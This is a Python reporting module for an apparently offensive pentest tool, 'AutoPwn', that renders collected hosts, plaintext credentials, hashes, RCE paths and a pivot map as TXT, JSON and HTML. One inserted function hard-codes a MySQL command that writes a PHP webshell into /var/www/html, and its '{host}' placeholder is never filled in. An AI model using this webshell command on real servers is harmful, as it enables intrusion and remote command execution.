import os, json, re
from datetime import datetime

SEVERITY_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4,"ERROR":5}
SEV_COLOURS    = {
    "CRITICAL":"#d32f2f","HIGH":"#f57c00","MEDIUM":"#fbc02d",
    "LOW":"#1976d2","INFO":"#616161","ERROR":"#6a1b9a"
}
SEV_BG = {
    "CRITICAL":"#b71c1c","HIGH":"#e65100","MEDIUM":"#f9a825",
    "LOW":"#0d47a1","INFO":"#424242","ERROR":"#4a148c"
}

def _sev_sort(findings):
    return sorted(findings, key=lambda x: SEVERITY_ORDER.get(x.get("severity","INFO"), 9))

def generate_txt_report(ctx):
    out = os.path.join(ctx.out_dir, "reports", "final_report.txt")
    os.makedirs(os.path.dirname(out), exist_ok=True)
    now = datetime.now().isoformat(timespec="seconds")
    L = []
    a = L.append

    a("=" * 72)
    a("  AUTOPWN PENETRATION TEST REPORT")
    a("=" * 72)
    a(f"  Target   : {ctx.target}")
    a(f"  Domain   : {ctx.domain or 'not detected'}")
    a(f"  Started  : {ctx.start_time}")
    a(f"  Finished : {now}")
    a("=" * 72)
    a("")

    # Executive Summary
    sev_count = {}
    for f in ctx.findings:
        sev_count[f.get("severity","INFO")] = sev_count.get(f.get("severity","INFO"),0)+1
    a("EXECUTIVE SUMMARY")
    a("-" * 40)
    for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO","ERROR"]:
        count = sev_count.get(s, 0)
        bar = "█" * min(count, 40)
        a(f"  {s:<10} {count:>4}  {bar}")
    a("")

    # Attack Surface
    a("ATTACK SURFACE")
    a("-" * 40)
    a(f"  Live Hosts  : {len(ctx.live_hosts)}")
    a(f"  Credentials : {len(ctx.loot.get('credentials',[]))}")
    a(f"  Hashes      : {len(ctx.loot.get('hashes',[]))}")
    a(f"  RCE Paths   : {len(ctx.loot.get('rce',[]))}")
    a(f"  Pivot Paths : {len(ctx.loot.get('pivot_paths',[]))}")
    a("")

    # Live Hosts
    a("LIVE HOSTS")
    a("-" * 40)
    for h in sorted(ctx.live_hosts):
        tcp = ctx.open_ports.get(h,{}).get("tcp",[])
        udp = ctx.open_ports.get(h,{}).get("udp",[])
        os_g = ctx.os_map.get(h,"Unknown")
        dns_name = ctx.loot.get("dns_records",{}).get(h,"")
        name_str = f"  ({dns_name})" if dns_name else ""
        a(f"  {h:<20}{name_str}")
        a(f"    OS   : {os_g}")
        a(f"    TCP  : {tcp[:30]}")
        if udp: a(f"    UDP  : {udp[:15]}")
        # Services
        svcs = ctx.service_map.get(h,{})
        for port, svc in sorted(svcs.items())[:10]:
            a(f"    {port}/{svc.get('proto','tcp'):<5} {svc.get('service','?'):<15} {svc.get('version','')[:40]}")
        a("")

    # RCE Paths - top priority
    if ctx.loot.get("rce"):
        a("REMOTE CODE EXECUTION (RCE)")
        a("-" * 40)
        for r in ctx.loot["rce"]:
            a(f"  [RCE] {r.get('host','?')} via {r.get('method','?')} as {r.get('user_ctx','?')}")
        a("")

    # Credentials
    if ctx.loot.get("credentials"):
        a("CREDENTIALS FOUND")
        a("-" * 40)
        for c in ctx.loot["credentials"]:
            a(f"  [{c.get('service','?'):<8}] {c.get('host','?'):<18} "
              f"{c.get('user','?')} : {c.get('password','?')}")
        a("")

    # Hashes
    if ctx.loot.get("hashes"):
        a("CAPTURED HASHES")
        a("-" * 40)
        for h in ctx.loot["hashes"]:
            a(f"  {h}")
        a("")

    # DNS Records
    if ctx.loot.get("dns_records"):
        a("DNS RECORDS DISCOVERED")
        a("-" * 40)
        for name, ip in sorted(ctx.loot["dns_records"].items()):
            a(f"  {name:<40} -> {ip}")
        a("")

    # Users
    if ctx.loot.get("users"):
        a("USERS ENUMERATED")
        a("-" * 40)
        for u in sorted(set(ctx.loot["users"]))[:50]:
            a(f"  {u}")
        a("")

    # All Findings
    a("ALL FINDINGS")
    a("-" * 40)
    for f in _sev_sort(ctx.findings):
        sev = f.get("severity","INFO")
        host = f.get("host","?")
        title = f.get("title","")
        a(f"  [{sev:<8}] [{host:<18}] {title}")
        detail = str(f.get("detail","")).strip()
        if detail:
            for line in detail.splitlines()[:3]:
                a(f"             {line[:80]}")
    a("")
    a("=" * 72)
    a("END OF REPORT")

    with open(out,"w") as fh:
        fh.write("\n".join(L))
    return out

def generate_json_report(ctx):
    out = os.path.join(ctx.out_dir, "reports", "findings.json")
    os.makedirs(os.path.dirname(out), exist_ok=True)
    data = {
        "meta": {
            "target":   ctx.target,
            "domain":   ctx.domain,
            "started":  ctx.start_time,
            "finished": datetime.now().isoformat(),
            "tool":     "AutoPwn",
        },
        "summary": {
            sev: sum(1 for f in ctx.findings if f.get("severity")==sev)
            for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO","ERROR"]
        },
        "live_hosts":   sorted(ctx.live_hosts),
        "open_ports":   ctx.open_ports,
        "service_map":  ctx.service_map,
        "os_map":       ctx.os_map,
        "evasion_map":  ctx.evasion_map,
        "findings":     _sev_sort(ctx.findings),
        "loot":         ctx.loot,
    }
    with open(out,"w") as f:
        json.dump(data, f, indent=2, default=str)
    return out

##########################
###NEW SECTION ADDED###
def _clean_findings(ctx):
    """Deduplicate, flag false positives, detect RCE chains."""
    # 1. Deduplicate by host + finding text
    seen = set()
    deduped = []
    for f in ctx.findings:
        key = f"{f.get('host')}:{f.get('severity')}:{f.get('finding','')[:80]}"
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    # 2. Flag known false positives
    fp_patterns = [
        "empty-password root login",
        "Open proxy on",
    ]
    for f in deduped:
        for pat in fp_patterns:
            if pat.lower() in str(f.get("finding","")).lower():
                f["severity"] = "INFO"
                f["finding"]  = "[LIKELY FALSE POSITIVE] " + f.get("finding","")

    # 3. RCE chain detection
    hosts_with_file_priv = {
        f.get("host") for f in deduped
        if "FILE privilege" in str(f.get("finding",""))
    }
    for host in hosts_with_file_priv:
        tcp = ctx.open_ports.get(host, {}).get("tcp", [])
        if 80 in tcp or 8080 in tcp:
            deduped.append({
                "severity": "CRITICAL",
                "host": host,
                "finding": "RCE Chain: MySQL FILE privilege + HTTP port open -> write PHP webshell to /var/www/html/",
                "detail": "mysql -h {host} -u root -ppassword -e \"SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php';\"",
            })

    ctx.findings = deduped
###NEW SECTION - EOF ###
###################################


# =============================================================================
# PIVOT TREE  -  new addition.
# Reads post/pivot_scanner/ and builds an interactive click-to-expand node
# diagram showing how each host was reached and what was found on it.
# Called only by generate_html_report(). No existing functions changed.
# =============================================================================

def _build_pivot_tree_data(ctx):
    """
    Walk post/pivot_scanner/ and build a nested tree dict describing how
    each host was discovered (directly or via pivot), with ports/services/creds.
    """
    pivot_base = os.path.join(ctx.out_dir, "post", "pivot_scanner")

    # pivot_map: pivot_ip -> list of {"ip": target_ip, "services": [svc, ...]}
    pivot_map = {}

    if os.path.isdir(pivot_base):
        for pivot_dir_name in sorted(os.listdir(pivot_base)):
            pivot_dir_path = os.path.join(pivot_base, pivot_dir_name)
            if not os.path.isdir(pivot_dir_path):
                continue
            pivot_ip = pivot_dir_name.replace("_", ".")
            discoveries = []
            for subdir_name in sorted(os.listdir(pivot_dir_path)):
                subdir = os.path.join(pivot_dir_path, subdir_name)
                if not os.path.isdir(subdir):
                    continue
                # subdir names like "192_168_1_5_mysql" or "10_10_10_3_ssh"
                parts = subdir_name.rsplit("_", 1)
                if len(parts) == 2:
                    target_ip_raw, svc = parts
                    target_ip = target_ip_raw.replace("_", ".")
                else:
                    target_ip = subdir_name.replace("_", ".")
                    svc = "unknown"
                existing = next((d for d in discoveries if d["ip"] == target_ip), None)
                if existing:
                    existing["services"].append(svc)
                else:
                    discoveries.append({"ip": target_ip, "services": [svc]})
            pivot_map[pivot_ip] = discoveries

    seed = ctx.target if ctx.target else (sorted(ctx.live_hosts)[0] if ctx.live_hosts else "unknown")

    def _node(ip, node_type="host", pivot_services=None):
        tcp   = ctx.open_ports.get(ip, {}).get("tcp", [])
        svcs  = ctx.service_map.get(ip, {})
        os_g  = ctx.os_map.get(ip, "")
        creds = [
            "{u}:{p} ({s})".format(
                u=c.get("user","?"), p=c.get("password","?"), s=c.get("service","?"))
            for c in ctx.loot.get("credentials", [])
            if c.get("host") == ip
        ]
        findings_ct = sum(1 for f in ctx.findings if f.get("host") == ip)
        sev_top = "none"
        for sev in ["CRITICAL","HIGH","MEDIUM","LOW"]:
            if any(f.get("host") == ip and f.get("severity") == sev for f in ctx.findings):
                sev_top = sev.lower()
                break
        svc_labels = {str(port): v.get("service","?") for port, v in svcs.items()}
        children = []
        if ip in pivot_map:
            for disc in pivot_map[ip]:
                child_ip = disc["ip"]
                child = _node(child_ip, "pivot-target", disc["services"])
                children.append(child)
        return {
            "ip":             ip,
            "type":           node_type,
            "os":             os_g,
            "ports":          tcp[:20],
            "services":       svc_labels,
            "creds":          creds,
            "findings_ct":    findings_ct,
            "sev_top":        sev_top,
            "children":       children,
            "pivot_services": pivot_services or [],
        }

    tree = _node(seed, "seed")

    # Attach any other pivot hosts that aren't already children of seed
    for pivot_ip in sorted(pivot_map.keys()):
        if pivot_ip == seed:
            continue
        already = any(c["ip"] == pivot_ip for c in tree["children"])
        if not already and pivot_ip in ctx.live_hosts:
            tree["children"].append(_node(pivot_ip, "pivot"))

    return tree


def _build_pivot_tree_html(ctx):
    """Return full HTML+CSS+JS card for the interactive pivot tree diagram."""
    tree      = _build_pivot_tree_data(ctx)
    tree_json = json.dumps(tree, default=str)

    return """
<div class="card" id="pivot-tree-section">
  <h2>&#127760; Pivot Network Map <span style="font-size:0.65em;color:#8b949e;font-weight:normal">&mdash; click any node to expand / collapse</span></h2>
  <div id="pt-legend" style="display:flex;gap:14px;flex-wrap:wrap;margin-bottom:14px;font-size:0.82em;color:#8b949e">
    <span><span class="pt-dot" style="background:#f0883e"></span>Entry point</span>
    <span><span class="pt-dot" style="background:#58a6ff"></span>Direct host</span>
    <span><span class="pt-dot" style="background:#3fb950"></span>Pivot gateway</span>
    <span><span class="pt-dot" style="background:#a371f7"></span>Pivot-discovered</span>
    <span><span class="pt-dot" style="background:#f85149;border-radius:2px"></span>Critical finding</span>
  </div>
  <div id="pt-root" style="overflow:auto;padding:4px 0"></div>
</div>

<style>
.pt-dot{display:inline-block;width:11px;height:11px;border-radius:50%;margin-right:5px;vertical-align:middle}
.pt-tree{list-style:none;padding:0;margin:0}
.pt-tree .pt-tree{margin-left:28px;border-left:2px solid #21262d;padding-left:0}
.pt-item{position:relative;padding:0}
.pt-card{
  display:inline-flex;flex-direction:column;
  background:#161b22;border:1px solid #30363d;border-radius:8px;
  padding:9px 14px;margin:5px 0 5px 12px;
  cursor:pointer;user-select:none;
  min-width:190px;max-width:340px;
  transition:border-color .15s,background .15s;
  position:relative;
}
.pt-card::before{
  content:'';position:absolute;left:-13px;top:50%;
  width:13px;height:2px;background:#21262d;
}
.pt-card:hover{border-color:#58a6ff;background:#1c2128}
.pt-card.type-seed{border-color:#f0883e;border-width:2px}
.pt-card.type-pivot{border-color:#3fb950}
.pt-card.type-pivot-target{border-color:#a371f7}
.pt-card.sev-critical{box-shadow:0 0 0 2px #f85149}
.pt-card.sev-high{box-shadow:0 0 0 2px #f57c00}
.pt-head{display:flex;align-items:center;gap:7px;font-family:monospace;font-weight:bold;color:#e6edf3;font-size:0.97em}
.pt-expand{margin-left:auto;color:#8b949e;font-size:0.7em;transition:transform .15s}
.pt-expand.open{transform:rotate(90deg)}
.pt-body{font-size:0.77em;color:#8b949e;margin-top:5px;line-height:1.7}
.pt-svc{display:inline-block;background:#21262d;color:#79c0ff;border-radius:3px;padding:0 6px;font-family:monospace;font-size:0.9em;margin:1px}
.pt-cred{display:inline-block;background:#3d1a1a;color:#f85149;border-radius:3px;padding:0 6px;font-family:monospace;font-size:0.9em;margin:1px}
.pt-children{display:block}
.pt-children.hidden{display:none}
</style>

<script>
(function(){
  var TREE = """ + tree_json + """;

  var COLOUR = {seed:"#f0883e","pivot":"#3fb950","pivot-target":"#a371f7",host:"#58a6ff"};
  var LABEL  = {seed:"ENTRY","pivot":"PIVOT","pivot-target":"VIA PIVOT",host:""};

  function mkNode(node, depth){
    var hasKids = node.children && node.children.length > 0;
    var colour  = COLOUR[node.type] || "#58a6ff";
    var lbl     = LABEL[node.type]  || "";
    var sevCls  = node.sev_top !== "none" ? " sev-" + node.sev_top : "";

    // service badges
    var svcHtml = "";
    Object.entries(node.services || {}).slice(0,10).forEach(function(e){
      svcHtml += '<span class="pt-svc">'+e[0]+'/'+e[1]+'</span>';
    });
    if(!svcHtml)(node.pivot_services||[]).forEach(function(s){
      svcHtml += '<span class="pt-svc">'+s+'</span>';
    });

    // cred badges
    var credHtml = "";
    (node.creds||[]).slice(0,3).forEach(function(c){
      credHtml += '<span class="pt-cred">&#128273; '+c+'</span>';
    });

    var typePill = lbl
      ? '<span style="font-size:0.68em;padding:1px 6px;border-radius:4px;background:#21262d;color:'+colour+';font-weight:bold">'+lbl+'</span>'
      : '';
    var sevIcon = {critical:"&#128308;",high:"&#128992;",medium:"&#128993;",low:"&#128994;",none:""}[node.sev_top]||"";
    var expandIcon = hasKids ? '<span class="pt-expand'+(depth===0?' open':'')+'">&#9654;</span>' : '';

    var bodyParts = [];
    if(node.os)        bodyParts.push('<span>&#128187; '+node.os+'</span>');
    if(node.ports&&node.ports.length) bodyParts.push('<span>Ports: '+node.ports.slice(0,14).join(', ')+'</span>');
    if(svcHtml)        bodyParts.push(svcHtml);
    if(credHtml)       bodyParts.push(credHtml);
    if(node.findings_ct) bodyParts.push('<span>&#128269; '+node.findings_ct+' finding'+(node.findings_ct>1?'s':'')+'</span>');

    var li = document.createElement('li');
    li.className = 'pt-item';

    var card = document.createElement('div');
    card.className = 'pt-card type-'+node.type + sevCls;
    card.innerHTML =
      '<div class="pt-head">'
        +'<span style="display:inline-block;width:9px;height:9px;border-radius:50%;background:'+colour+';flex-shrink:0"></span>'
        +' '+node.ip
        +(typePill?' '+typePill:'')
        +(sevIcon?' '+sevIcon:'')
        +expandIcon
      +'</div>'
      +(bodyParts.length?'<div class="pt-body">'+bodyParts.join('<br>')+'</div>':'');
    li.appendChild(card);

    if(hasKids){
      var ul = document.createElement('ul');
      ul.className = 'pt-tree pt-children'+(depth===0?'':' hidden');
      node.children.forEach(function(child){ ul.appendChild(mkNode(child, depth+1)); });
      li.appendChild(ul);

      card.addEventListener('click', function(){
        var hidden = ul.classList.toggle('hidden');
        var icon   = card.querySelector('.pt-expand');
        if(icon) icon.classList.toggle('open', !hidden);
      });
    }
    return li;
  }

  var root = document.getElementById('pt-root');
  if(root){
    var ul = document.createElement('ul');
    ul.className = 'pt-tree';
    ul.appendChild(mkNode(TREE, 0));
    root.appendChild(ul);
  }
})();
</script>
"""


def generate_html_report(ctx):
    _clean_findings(ctx) ### CALLING THE NEW SECTION
    out = os.path.join(ctx.out_dir, "reports", "report.html")
    os.makedirs(os.path.dirname(out), exist_ok=True)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Severity summary pills
    sev_count = {s: sum(1 for f in ctx.findings if f.get("severity")==s)
                 for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO","ERROR"]}
    pills = "".join(
        f'<span class="pill" style="background:{SEV_BG[s]}">'
        f'<b>{s}</b>: {sev_count[s]}</span>'
        for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"] if sev_count[s]
    )

    # Host table rows
    host_rows = ""
    for h in sorted(ctx.live_hosts):
        tcp  = ", ".join(str(p) for p in ctx.open_ports.get(h,{}).get("tcp",[])[:20])
        os_g = ctx.os_map.get(h, "?")
        dns  = ctx.loot.get("dns_records",{}).get(h,"")
        svcs = ctx.service_map.get(h,{})
        svc_str = " | ".join(
            f"{port}/{v.get('service','?')} {v.get('version','')[:20]}"
            for port,v in sorted(svcs.items())[:8]
        )
        host_rows += (f"<tr><td><b>{h}</b><br><small style='color:#8b949e'>{dns}</small></td>"
                      f"<td>{os_g}</td><td><small>{tcp}</small></td>"
                      f"<td><small>{svc_str}</small></td></tr>")

    # Credentials table
    cred_rows = "".join(
        f"<tr><td>{c.get('service','')}</td><td>{c.get('host','')}</td>"
        f"<td><code>{c.get('user','')}</code></td>"
        f"<td><code>{c.get('password','')}</code></td></tr>"
        for c in ctx.loot.get("credentials",[])
    )

    # RCE table
    rce_rows = "".join(
        f"<tr><td><span class='pill' style='background:#b71c1c'>RCE</span></td>"
        f"<td>{r.get('host','')}</td><td>{r.get('method','')}</td>"
        f"<td><code>{r.get('user_ctx','')}</code></td></tr>"
        for r in ctx.loot.get("rce",[])
    )

    # Hash table
    hash_rows = "".join(
        f"<tr><td><code style='font-size:0.8em'>{h}</code></td></tr>"
        for h in ctx.loot.get("hashes",[])
    )

    # All findings table
    find_rows = ""
    for f in _sev_sort(ctx.findings):
        sev   = f.get("severity","INFO")
        col   = SEV_COLOURS.get(sev,"#999")
        bg    = SEV_BG.get(sev,"#333")
        detail = str(f.get("detail","")).replace("<","&lt;").replace(">","&gt;")
        detail = detail.replace("\n","<br>")[:400]
        find_rows += (
            f"<tr>"
            f"<td><span class='pill' style='background:{bg}'>{sev}</span></td>"
            f"<td style='color:#79c0ff'>{f.get('host','?')}</td>"
            f"<td>{f.get('title','')}</td>"
            f"<td><small style='color:#8b949e'>{detail}</small></td>"
            f"<td style='color:#8b949e;font-size:0.75em'>{f.get('ts','')}</td>"
            f"</tr>"
        )

    # DNS records
    dns_rows = "".join(
        f"<tr><td>{name}</td><td>{ip}</td></tr>"
        for name, ip in sorted(ctx.loot.get("dns_records",{}).items())
    )

    # Pivot tree (new - inserted between credentials and findings)
    pivot_tree_html = _build_pivot_tree_html(ctx)

    # Nav links
    main_nav_items = [
        ("sec-summary",  "&#9889; Summary"),
        ("sec-hosts",    "&#128205; Hosts"),
        ("sec-creds",    "&#128273; Creds"),
        ("sec-pivot",    "&#127760; Pivot Map"),
        ("sec-findings", "&#128269; Findings"),
    ]
    if ctx.loot.get("rce"):
        main_nav_items.insert(1, ("sec-rce", "&#128308; RCE"))
    if ctx.loot.get("hashes"):
        main_nav_items.append(("sec-hashes", "&#128272; Hashes"))
    if ctx.loot.get("dns_records"):
        main_nav_items.append(("sec-dns", "&#127758; DNS"))

    main_nav = "".join(
        f'<a href="#{nid}" class="mnl">{label}</a>'
        for nid, label in main_nav_items
    )

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AutoPwn Report &mdash; {ctx.target}</title>
<style>
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{font-family:'Segoe UI',Arial,sans-serif;background:#0d1117;color:#c9d1d9;padding:0;padding-top:52px}}
  .mnav{{
    position:fixed;top:0;left:0;right:0;z-index:1000;
    background:#161b22;border-bottom:2px solid #58a6ff;
    display:flex;align-items:center;gap:4px;
    padding:0 24px;height:52px;
    overflow-x:auto;white-space:nowrap;scrollbar-width:thin;
  }}
  .mnav::-webkit-scrollbar{{height:4px}}
  .mnav::-webkit-scrollbar-thumb{{background:#30363d;border-radius:2px}}
  .mnav-brand{{color:#58a6ff;font-weight:bold;font-size:0.9em;margin-right:12px;flex-shrink:0}}
  .mnl{{
    color:#8b949e;text-decoration:none;font-size:0.82em;
    padding:6px 12px;border-radius:6px;flex-shrink:0;
    transition:background .15s,color .15s;
  }}
  .mnl:hover{{background:#21262d;color:#e6edf3}}
  .mnl.active{{background:#1f3a5f;color:#58a6ff}}
  [id]{{scroll-margin-top:64px}}
  header{{background:#161b22;border-bottom:2px solid #30363d;padding:20px 32px}}
  h1{{color:#58a6ff;font-size:1.6em;margin-bottom:6px}}
  .meta{{color:#8b949e;font-size:0.9em}}
  main{{padding:24px 32px}}
  h2{{color:#79c0ff;font-size:1.1em;margin:24px 0 10px;border-bottom:1px solid #21262d;padding-bottom:6px}}
  h3{{color:#8b949e;font-size:0.9em;margin:12px 0 6px}}
  .pills{{margin:12px 0}}
  .pill{{display:inline-block;padding:3px 12px;border-radius:12px;color:#fff;font-size:0.82em;font-weight:bold;margin:2px}}
  .card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin-bottom:20px}}
  table{{width:100%;border-collapse:collapse;font-size:0.88em}}
  th{{background:#0d1117;color:#58a6ff;padding:8px 10px;text-align:left;border-bottom:2px solid #30363d}}
  td{{padding:7px 10px;border-bottom:1px solid #21262d;vertical-align:top}}
  tr:hover td{{background:#161b22}}
  code{{background:#21262d;padding:1px 5px;border-radius:4px;font-family:monospace;color:#e6edf3}}
  .stat-grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:12px;margin-bottom:16px}}
  .stat-box{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px;text-align:center}}
  .stat-num{{font-size:2em;font-weight:bold;color:#58a6ff}}
  .stat-lbl{{font-size:0.8em;color:#8b949e}}
  .empty{{color:#8b949e;font-style:italic;padding:12px}}
  footer{{text-align:center;color:#8b949e;font-size:0.8em;padding:20px;border-top:1px solid #21262d;margin-top:20px}}
</style>
</head>
<body>

<nav class="mnav">
  <span class="mnav-brand">&#9889; AutoPwn</span>
  {main_nav}
</nav>

<header id="sec-summary">
  <h1>&#9889; AutoPwn Penetration Test Report</h1>
  <div class="meta">
    Target: <b style="color:#e6edf3">{ctx.target}</b>
    &nbsp;|&nbsp; Domain: <b style="color:#e6edf3">{ctx.domain or "not detected"}</b>
    &nbsp;|&nbsp; Started: {ctx.start_time}
    &nbsp;|&nbsp; Finished: {now}
  </div>
</header>
<main>

<div class="card">
  <h2>Executive Summary</h2>
  <div class="stat-grid">
    <div class="stat-box"><div class="stat-num">{len(ctx.live_hosts)}</div><div class="stat-lbl">Live Hosts</div></div>
    <div class="stat-box"><div class="stat-num" style="color:#d32f2f">{sev_count.get("CRITICAL",0)}</div><div class="stat-lbl">Critical</div></div>
    <div class="stat-box"><div class="stat-num" style="color:#f57c00">{sev_count.get("HIGH",0)}</div><div class="stat-lbl">High</div></div>
    <div class="stat-box"><div class="stat-num" style="color:#fbc02d">{sev_count.get("MEDIUM",0)}</div><div class="stat-lbl">Medium</div></div>
    <div class="stat-box"><div class="stat-num">{len(ctx.loot.get("credentials",[]))}</div><div class="stat-lbl">Credentials</div></div>
    <div class="stat-box"><div class="stat-num" style="color:#d32f2f">{len(ctx.loot.get("rce",[]))}</div><div class="stat-lbl">RCE Paths</div></div>
    <div class="stat-box"><div class="stat-num">{len(ctx.loot.get("hashes",[]))}</div><div class="stat-lbl">Hashes</div></div>
    <div class="stat-box"><div class="stat-num">{len(ctx.loot.get("users",[]))}</div><div class="stat-lbl">Users Found</div></div>
  </div>
  <div class="pills">{pills}</div>
</div>

{"<div class='card' id='sec-rce'><h2>&#128308; Remote Code Execution</h2><table><tr><th>Type</th><th>Host</th><th>Method</th><th>Context</th></tr>" + rce_rows + "</table></div>" if ctx.loot.get("rce") else ""}

<div class="card" id="sec-hosts">
  <h2>Live Hosts ({len(ctx.live_hosts)})</h2>
  <table>
    <tr><th>Host</th><th>OS</th><th>Open TCP Ports</th><th>Services</th></tr>
    {host_rows if host_rows else '<tr><td colspan="4" class="empty">No hosts discovered</td></tr>'}
  </table>
</div>

<div class="card" id="sec-creds">
  <h2>Credentials ({len(ctx.loot.get("credentials",[]))})</h2>
  <table>
    <tr><th>Service</th><th>Host</th><th>Username</th><th>Password</th></tr>
    {cred_rows if cred_rows else '<tr><td colspan="4" class="empty">None found</td></tr>'}
  </table>
</div>

<div id="sec-pivot">{pivot_tree_html}</div>

{"<div class='card' id='sec-hashes'><h2>Captured Hashes (" + str(len(ctx.loot.get("hashes",[]))) + ")</h2><table><tr><th>Hash</th></tr>" + hash_rows + "</table></div>" if ctx.loot.get("hashes") else ""}

{"<div class='card' id='sec-dns'><h2>DNS Records (" + str(len(ctx.loot.get("dns_records",{}))) + ")</h2><table><tr><th>Name</th><th>IP</th></tr>" + dns_rows + "</table></div>" if ctx.loot.get("dns_records") else ""}

<div class="card" id="sec-findings">
  <h2>All Findings ({len(ctx.findings)})</h2>
  <table>
    <tr><th>Severity</th><th>Host</th><th>Finding</th><th>Detail</th><th>Time</th></tr>
    {find_rows if find_rows else '<tr><td colspan="5" class="empty">No findings</td></tr>'}
  </table>
</div>

</main>
<footer>Generated by AutoPwn &mdash; {now}</footer>

<script>
(function(){{
  var links   = Array.from(document.querySelectorAll('.mnl'));
  var targets = links.map(function(l){{return document.querySelector(l.getAttribute('href'));}});
  function onScroll(){{
    var sy = window.scrollY + 80;
    var active = null;
    for(var i=0;i<targets.length;i++){{if(targets[i]&&targets[i].offsetTop<=sy) active=i;}}
    links.forEach(function(l,i){{l.classList.toggle('active',i===active);}});
  }}
  window.addEventListener('scroll', onScroll, {{passive:true}});
  onScroll();
}})();
document.querySelectorAll('a[href^="#"]').forEach(function(a){{
  a.addEventListener('click',function(e){{
    var t=document.querySelector(a.getAttribute('href'));
    if(!t) return;
    e.preventDefault();
    window.scrollTo({{top:t.offsetTop-64,behavior:'smooth'}});
  }});
}});
</script>
</body>
</html>"""

    with open(out,"w") as f:
        f.write(html)
    return out
